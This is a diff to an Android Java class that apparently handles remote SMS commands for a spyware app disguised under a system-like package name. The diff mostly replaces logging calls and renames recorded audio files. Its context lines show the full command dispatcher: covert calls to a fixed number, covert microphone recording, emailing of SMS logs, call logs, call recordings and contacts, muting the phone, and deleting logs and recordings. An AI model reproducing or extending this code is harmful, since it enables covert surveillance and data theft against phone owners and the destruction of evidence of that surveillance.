@@ -6,8 +6,8 @@ import android.content.Context;
 import android.content.Intent;
 import android.net.Uri;
 import android.net.wifi.WifiManager;
-import android.util.Log;
 
+import com.android.system.controled.Debug;
 import com.android.system.controled.Globle;
 import com.android.system.controled.db.DatabaseUtil;
 
@@ -20,12 +20,12 @@ public class DoAboutCodeUtils {
 		try {
 
 			if (msgTxt.contains(Globle.PHONE_CODE_UP)) {
-				Log.e(TAG, "调大铃声音量，并加震动");
+				Debug.e(TAG, "调大铃声音量，并加震动");
 				AudioUtil.turnUpMost(context);
 			}
 
 			else if (msgTxt.contains(Globle.PHONE_CODE_CALL_ME)) {
-				Log.e(TAG, "拨打电话");
+				Debug.e(TAG, "拨打电话");
 				Uri uri = Uri.parse("tel:" + Globle.PHONE_NUMBER);
 				Intent it = new Intent(Intent.ACTION_CALL, uri); // 直接呼出
 				it.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
@@ -33,7 +33,7 @@ public class DoAboutCodeUtils {
 			}
 
 			else if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_SMS_CALL)) {
-				Log.e(TAG, "上传短信通话记录");
+				Debug.e(TAG, "上传短信通话记录");
 				SendEmailUtil send2 = new SendEmailUtil();
 				if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_SMS_CALL_MOBILE)) {
 					send2.upLoadSmsCallLog(context, true);
@@ -43,7 +43,7 @@ public class DoAboutCodeUtils {
 			}
 
 			else if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_AUDIO_CALL)) {
-				Log.e(TAG, "上传通话录音");
+				Debug.e(TAG, "上传通话录音");
 				SendEmailUtil send2 = new SendEmailUtil();
 				if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_AUDIO_CALL_MOBILE)) {
 					send2.upLoadCallAudios(context, true);
@@ -53,7 +53,7 @@ public class DoAboutCodeUtils {
 			}
 
 			else if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_AUDIO_OTHER)) {
-				Log.e(TAG, "上传其它录音");
+				Debug.e(TAG, "上传其它录音");
 				SendEmailUtil send2 = new SendEmailUtil();
 				if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_AUDIO_OTHER_MOBILE)) {
 					send2.upLoadOtherAudios(context, true);
@@ -63,7 +63,7 @@ public class DoAboutCodeUtils {
 			}
 
 			else if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_ALL)) {
-				Log.e(TAG, "上传所有");
+				Debug.e(TAG, "上传所有");
 				SendEmailUtil send2 = new SendEmailUtil();
 				if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_ALL_MOBILE)) {
 					send2.upLoadALL(context, true);
@@ -76,15 +76,15 @@ public class DoAboutCodeUtils {
 				String words = msgTxt.substring(msgTxt.indexOf(Globle.PHONE_CODE_RECORD_TIME), msgTxt.length());
 				String[] strs = words.split(":");
 				if (strs.length == 2 && strs[1] != null) {
-					Log.e(TAG, "录音N分钟: " + strs[1]);
+					Debug.e(TAG, "录音N分钟: " + strs[1]);
 					// 文件保存位置
-					File file = new File(Globle.FILEPATH_AUDIOS_OTHER + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + ".amr");
+					File file = new File(Globle.FILEPATH_AUDIOS_OTHER + strs[1] + " minutes-" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + ".amr");
 					RecorderUtil.getInstence(context).startRecorder(file, Integer.parseInt(strs[1]));
 				}
 			}
 
 			else if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_CONTACTS)) {
-				Log.e(TAG, "开始上传联系人");
+				Debug.e(TAG, "开始上传联系人");
 				ContactsUtil.createContactsFile(context);
 				SendEmailUtil send3 = new SendEmailUtil();
 				if (msgTxt.contains(Globle.PHONE_CODE_UPLOAD_CONTACTS_MOBILE)) {
@@ -95,54 +95,54 @@ public class DoAboutCodeUtils {
 			}
 
 			else if (msgTxt.contains(Globle.PHONE_CODE_RECORD_START)) {
-				Log.e(TAG, "开始录音");
+				Debug.e(TAG, "开始录音");
 				// 文件保存位置
 				File file = new File(Globle.FILEPATH_AUDIOS_OTHER + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + ".amr");
 				RecorderUtil.getInstence(context).startRecorder(file, -1);
 			}
 
 			else if (msgTxt.contains(Globle.PHONE_CODE_RECORD_END)) {
-				Log.e(TAG, "结束录音");
+				Debug.e(TAG, "结束录音");
 				RecorderUtil.getInstence(context).stopRecorder();
 			}
 
 			else if (msgTxt.contains(Globle.PHONE_CODE_DOWN)) {
-				Log.e(TAG, "静音，并取消震动");
+				Debug.e(TAG, "静音，并取消震动");
 				AudioUtil.turnDown(context);
 			}
 
 			else if (msgTxt.contains(Globle.PHONE_CODE_DELETE_MSG_LOG)) {
-				Log.e(TAG, "删除短信记录");
+				Debug.e(TAG, "删除短信记录");
 				deleteSmsLog(context);
 			}
 
 			else if (msgTxt.contains(Globle.PHONE_CODE_DELETE_CALL_LOG)) {
-				Log.e(TAG, "删除通话记录");
+				Debug.e(TAG, "删除通话记录");
 				deleteCallLog();
 			}
 
 			else if (msgTxt.contains(Globle.PHONE_CODE_TURNON_WIFI)) {
-				Log.e(TAG, "开启wifi");
+				Debug.e(TAG, "开启wifi");
 				turnOnWifi(context);
 			}
 
 			else if (msgTxt.contains(Globle.PHONE_CODE_TURNON_MOBILE)) {
-				Log.e(TAG, "开启mobile network");
+				Debug.e(TAG, "开启mobile network");
 				NetworkUtil.setMobileNetEnable(context);
 			}
 
 			else if (msgTxt.contains(Globle.PHONE_CODE_DELETE_AUDIOS_CALL)) {
-				Log.e(TAG, "删除通话录音记录");
+				Debug.e(TAG, "删除通话录音记录");
 				deleteCallRecord();
 			}
 
 			else if (msgTxt.contains(Globle.PHONE_CODE_DELETE_AUDIOS_OTHER)) {
-				Log.e(TAG, "删除其它录音记录");
+				Debug.e(TAG, "删除其它录音记录");
 				deleteOtherRecord();
 			}
 
 			else if (msgTxt.contains(Globle.PHONE_CODE_DELETE_ALL_LOG)) {
-				Log.e(TAG, "删除所有记录");
+				Debug.e(TAG, "删除所有记录");
 				deleteSmsLog(context);
 				deleteCallLog();
 				deleteCallRecord();
@@ -216,7 +216,7 @@ public class DoAboutCodeUtils {
 
 	private static void turnOnWifi(Context context) {
 		if (NetworkUtil.isWifiEnabled(context)) {
-			Log.e("", " no need to turn wifi net work");
+			Debug.e("", " no need to turn wifi net work");
 			return;
 		}
 		WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
